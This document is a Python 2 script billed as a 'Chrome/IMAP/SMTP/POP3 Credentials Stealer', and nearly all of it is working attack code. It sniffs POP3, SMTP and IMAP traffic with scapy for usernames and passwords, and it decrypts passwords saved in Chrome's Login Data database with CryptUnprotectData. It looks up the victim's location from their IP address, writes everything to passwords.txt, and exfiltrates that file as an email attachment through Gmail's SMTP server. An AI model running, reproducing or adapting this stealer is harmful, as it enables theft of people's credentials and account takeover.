from scapy.all import *
import argparse

flag1 = 0
user = #fill Username
passwd= #fill Password
def parser():
        global flag1
	
	parser = argparse.ArgumentParser("Chrome/IMAP/SMTP/POP3 Credentials Stealer")
	parser.add_argument('-ms', dest='mailSniff', action='store_true', default=False, help='Use to sniff credentials from local mail.')
	parser.add_argument('-cs', dest='chromeStealer', action='store_true', default=False, help='Use to steal chrome passwords')
	
	args = parser.parse_args()
        
	if args.mailSniff:
		print "Sniff: On"
		sniff(filter = "tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store = 0)	
	else:
		print "Sniff: Off"
	
	
	if args.chromeStealer:
		print "Chrome Stealing: On"
		
		print "1. Email it to default credentials"
		print "2. New Credentials"
		print "3. No Email!, Just Give me File"
		choice = int(input(": "))
		
		if choice == 1:                       
			flag1 = 1
			chromeStealer()
			
		elif choice == 2:
                        global user
                        global passwd
			user = (raw_input("User: "))
			passwd = (raw_input("Passwd: "))
	
			flag1 = 1
			chromeStealer()
			
		elif choice == 3:
                        flag = 0
                        chromeStealer()
                                            
                else:
			print "Wrong Option, No loop run again."
			exit()
			
	else:	
		print "Chrome Stealing: Off"
	

def packet_callback(packet):
	#print packet.show()
	if packet[TCP].payload:
	
		mail_packet = str(packet[TCP].payload)

		if "user" in mail_packet.lower() or "pass" in mail.packet.lower():
			print "[*] Server: %s" % packet[IP].dst
			print "[*] %s " % packet[TCP].payload

def chromeStealer():

	from os import getenv
	import sqlite3
	import win32crypt
	from platform import release
	from urllib import urlopen
	from json import load
	import sys	
	
	print "ChromeS: Initiated"
	f = open("passwords.txt", "w")
	
	# Connect to the Database
	
	try: # for vista and others
	    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
	    
	except: #for xp
	    conn = sqlite3.connect(getenv("USERPROFILE") + "\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data")
	
	cursor = conn.cursor()
	
	# Get the results
        #"""
	try:
	    readIP = urlopen("http://www.networksecuritytoolkit.org/nst/tools/ip.php").read()
	    try:
	        jd = load(urlopen("http://ipinfo.io/"+readIP+"/geo"))
	    except:
	        pass     
	except:
	    print "didnt read ip so no location"
	
	try:
	    print >>f,  "Lives in " + jd["city"] + ", " + jd["region"] + " " + jd["country"] + "\n"
	    try:
	        print >>f,  'IP: ' + readIP
	        + 'Windows: ' + release()
	    except:
	        pass
	except:
	    pass
        #"""	
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	for result in cursor.fetchall():
	  # Decrypt the Password
	    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	    if password:
	 
	        print >>f,  'Site: ' + result[0]
	        print >>f,  'Username: ' + result[1]
	        print >>f,  'Password: ' + password
	 
	f.close()

	print "ChromeS: Finished"
	 
	#Note: End of password decrypting

        #Check If Email Option is enabled 
	if flag1 == 1: # if Yes
                email() # then Email

def email():
        #Note: Start emailing
	
	import smtplib
	import mimetypes
	from email.mime.multipart import MIMEMultipart
	from email import encoders
	from email.message import Message
	from email.mime.audio import MIMEAudio
	from email.mime.base import MIMEBase
	from email.mime.image import MIMEImage
	from email.mime.text import MIMEText
	import os
	global user
	global passwd
	
	print "Emailing: Initiated"	 
	#Note: Your Email Account
	emailfrom = user
	emailto = user
	fileToSend = "passwords.txt"      
	user = user
	password = passwd

	 
	#Note: Email Subject Ect.
	 
	msg = MIMEMultipart()
	msg["From"] = emailfrom
	msg["To"] = emailto
	msg["Subject"] = "Passwords ;^)"
	msg.preamble = "Passwords yay yehhhhhh! :)"
	 
	ctype, encoding = mimetypes.guess_type(fileToSend) # guess ctype and encoding, which is text/plain 
	print "ctype: ", ctype
	print "encoding: ", encoding
	
	if ctype is None or encoding is not None:
	    ctype = "application/octet-stream"
	    print "ctype: ", ctype
	    
	maintype, subtype = ctype.split("/", 1)
	
	print "maintype: ", maintype
	print "subtype: ", subtype
	
	if maintype == "text":
	    fp = open(fileToSend)
	    # Note: we should handle calculating the charset
	    attachment = MIMEText(fp.read(), _subtype=subtype)
	    fp.close()
	    
	elif maintype == "image":
	    fp = open(fileToSend, "rb")
	    attachment = MIMEImage(fp.read(), _subtype=subtype)
	    fp.close()
	 
	elif maintype == "audio":
	    fp = open(fileToSend, "rb")
	    attachment = MIMEAudio(fp.read(), _subtype=subtype)
	    fp.close()
	else:
	    fp = open(fileToSend, "rb")
	    attachment = MIMEBase(maintype, subtype)
	    attachment.set_payload(fp.read())
	    fp.close()
	    encoders.encode_base64(attachment)
	    
	attachment.add_header("Content-Disposition", "attachment", filename=fileToSend)
	msg.attach(attachment)
	
	#Handeling SMTP server connection 
	server = smtplib.SMTP("smtp.gmail.com:587")
	server.starttls()
	server.login(user,password) #login
	server.sendmail(emailfrom, emailto, msg.as_string()) #send mail
	server.quit()
	
	print "Emailing: Finished"

def main():
	parser()

main()

print ("\nCompleted Process")
